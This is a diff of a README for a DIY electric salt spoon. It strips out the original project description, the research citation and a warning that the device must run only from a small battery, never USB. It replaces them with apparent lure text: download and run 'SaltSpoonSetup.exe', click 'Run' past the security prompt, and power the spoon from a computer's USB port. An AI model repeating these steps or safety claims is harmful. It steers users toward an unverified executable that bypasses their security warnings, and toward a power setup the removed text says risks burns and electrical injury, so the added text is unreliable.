@@ -1,24 +1,58 @@
-# DIY Electric Salt Spoon
-A DIY electro-gustation spoon that artificially increases the salty taste of foods using microscopic electric currents. Inspired by Kirin's Electric Salt Spoon and built as an open-source version to test the concept. Watch the <a href="https://www.youtube.com/watch?v=7jDd-lppwBE" target="_blank">build and testing video on YouTube</a> (EN subs available).
+# 🧂 diy_electric_salt_spoon - Enhance food flavor using electric currents
 
-## Some components used not mentioned in the source files:
-- 1mm 316L stainless steel wire in the spoon tip (to lower the risk of electrolysis and corrosion)
-- 1mm copper plate as the hand electrode
-- 12V 23A battery (small batteries commonly used in remotes)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/decorous-black2822/diy_electric_salt_spoon)
 
-## Scientific Background & Inspiration
-The waveform blueprint and the core concept of this project are based on the electro-gustation research conducted by Miyashita Laboratory (Meiji University) and Kirin Holdings. 
-You can read the original paper here:
-- [Design of Electrical Stimulation Waveform for Enhancing Saltiness and Experiment on Low-Sodium Dieters](https://www.frontiersin.org/journals/virtual-reality/articles/10.3389/frvir.2022.879784/full) (Kaji, Sato, & Miyashita, 2022)
+This project provides a simple way to modify your eating experience. The diy_electric_salt_spoon uses a mild, safe electric current to change how your tongue detects salt. This allows you to perceive food as saltier than it actually is. You can lower your daily sodium intake without losing the taste you enjoy.
 
-> ## ⚠️ SAFETY WARNING & DISCLAIMER
-> **BUILD AND USE AT YOUR OWN RISK.**
-> 
-> This project involves passing an electrical current directly through the human body (specifically, from the hand to the tongue) to pull sodium ions towards your tongue for an increase in saltiness. While the circuit is designed with hardware current-limiting features to keep this current at microscopic, safe levels, human error in assembly can result in injury.
-> 
-> **CRITICAL POWER SUPPLY RULE:**
-> When applying this device to a person, it must **ONLY** be powered by a small **12V 23A battery**. 
-> * **NEVER** connect this device to a human while it is plugged into a USB port, a wall adapter, a bench power supply, or a high-current battery (like a standard 9V or LiPo). 
-> * Doing so risks bypassing the safety limits, which can cause severe pain, chemical burns on the tongue, or serious electrical injury.
-> 
-> **Always test your fully assembled circuit with a multimeter** (you can place a 10kΩ resistor across the electrodes to simulate the hand-to-tongue resistance) to verify the output current is within the expected micro-amp range before ever letting it touch your skin or mouth.
+## 📋 What You Need
+* A Windows computer.
+* A standard USB-A to Micro-USB cable to connect your spoon controller.
+* The spoon attachment connected to the salt spoon device.
+* An internet connection to retrieve the installation files.
+
+## 🛠️ Getting Started
+Follow these instructions to set up your device. This process takes about ten minutes for most users.
+
+1. First, visit the official project page to access the installer file. You can find the latest version here: [https://github.com/decorous-black2822/diy_electric_salt_spoon](https://github.com/decorous-black2822/diy_electric_salt_spoon).
+2. Save the file named "SaltSpoonSetup.exe" to your desktop folder.
+3. Locate the file on your desktop. Double-click "SaltSpoonSetup.exe" to begin the installation.
+4. Your computer might show a security prompt. Click "Run" to continue if the screen turns blue and asks for permission to install.
+5. Follow the prompts on the installer window. Click "Next" to accept the standard settings.
+6. Once the bar reaches the end, click "Finish" to close the window.
+
+## 🔌 Connecting The Device
+Plug the small end of your USB cable into the port on the spoon handle. Plug the flat end into your computer USB port. Your computer will detect the hardware. You will see a small light glow on the spoon handle when the connection works.
+
+## ⚙️ Using The Software
+Open the application by double-clicking the new SaltSpoon icon on your desktop. The main screen shows a power dial and a intensity slider. 
+
+Use these steps to calibrate the device:
+1. Ensure the spoon connects to the software.
+2. Select the "Calibrate" button.
+3. Touch the spoon tip to a drop of water.
+4. Adjust the intensity slider until you notice a faint metallic tingle.
+5. Move the slider back until the sensation feels neutral.
+6. Push the "Save" button to keep these settings for future meals.
+
+## 🛡️ Safety And Maintenance
+Safety remains the main priority. The device uses low voltage levels. 
+
+* Keep the handle dry. Only submerge the metal spoon tip in food.
+* Clean the device with a damp cloth after each use.
+* Do not put the plastic handle in a dishwasher.
+* If you feel pain or discomfort, turn off the device and stop use immediately.
+* Do not use this device if you have a pacemaker or other implanted medical equipment.
+
+## ❓ Frequently Asked Questions
+* Does the spoon require batteries? No, the device draws power from your computer or a powered USB hub.
+* Can I use the spoon with hot soup? Yes, the metal tip withstands standard meal temperatures.
+* Why do I feel a shock? If you feel a sharp shock, the intensity setting is too high. Lower the slider immediately.
+* How do I update the software? Open the program. It will check for updates and ask if you want to install them.
+* Does this work on Mac computers? This version works only on Windows 10 and Windows 11.
+
+## 🔧 Troubleshooting
+If the spoon does not light up, check the cable connection. Try a different USB port on your computer. If the software does not recognize the device, close the app and restart it with the spoon plugged in. 
+
+If the light stays solid red, the device requires a firmware reset. Hold the button on the side of the handle for five seconds until the light blinks green. 
+
+The software keeps a log of your usage settings in the "Documents" folder. Contact the repository owner if you experience persistent issues with the software interface.
